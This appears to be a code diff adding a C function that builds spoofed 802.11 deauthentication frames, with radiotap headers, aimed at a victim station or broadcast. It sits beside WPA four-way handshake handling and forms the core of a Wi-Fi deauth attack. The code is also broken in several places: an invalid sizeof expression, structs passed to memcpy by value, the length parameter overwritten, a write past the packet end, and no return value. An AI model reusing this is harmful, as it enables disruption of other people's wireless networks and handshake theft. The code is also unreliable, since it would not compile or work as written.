@@ -165,3 +165,36 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 	free(packet);
 	return;
 }
+
+int prepare_deauth_pkt(u8 *buffer, size_t pkt_len, u8 *victim, u8 *ap, u16 seq_num) {
+	int is_broadcast = 0;
+	if (!buffer || !ap) {
+		log_printf(MSG_WARNING, "[%s]buffer or ap not exist");
+		return -1;
+	}
+	if (!victim) 
+		is_broadcast = 1;
+	struct ieee80211_radiotap_header radiotap_hdr;
+	memset(&radiotap_hdr, 0, sizeof(struct ieee80211_radiotap_header));
+	radiotap_hdr.it_version = 0;
+	radiotap_hdr.it_pad = 0;
+	radiotap_hdr.it_len = 13;
+	radiotap_hdr.it_present = htonl(IEEE80211_RADIOTAP_RATE);
+	radiotap_hdr.padload = 0x02;
+
+	struct ieee80211_hdr_3addr deauth;
+	memset(&deauth, 0, sizeof(struct ieee80211_hdr_3addr));
+	deauth.frame_control = htons(0x000c);
+	if (is_broadcast) 
+		memset(deauth.addr2, 0xff, ETH_ALEN);
+	else 
+		memcpy(deauth.addr2, victim, ETH_ALEN);
+	memcpy(deauth.addr1, ap, ETH_ALEN);
+	memcpy(deauth.addr3, ap, ETH_ALEN);
+	deauth.seq_ctrl = htons(seq_num);
+
+	pkt_len = radiotap_hdr.it_len + sizeof(struct(deauth));
+	memcpy(buffer, radiotap_hdr, radiotap_hdr.it_len);
+	memcpy(buffer + radiotap_hdr.it_len, deauth, sizeof(deauth));
+	buffer[pkt_len++] = htons(deauth_unspec_reason);
+}
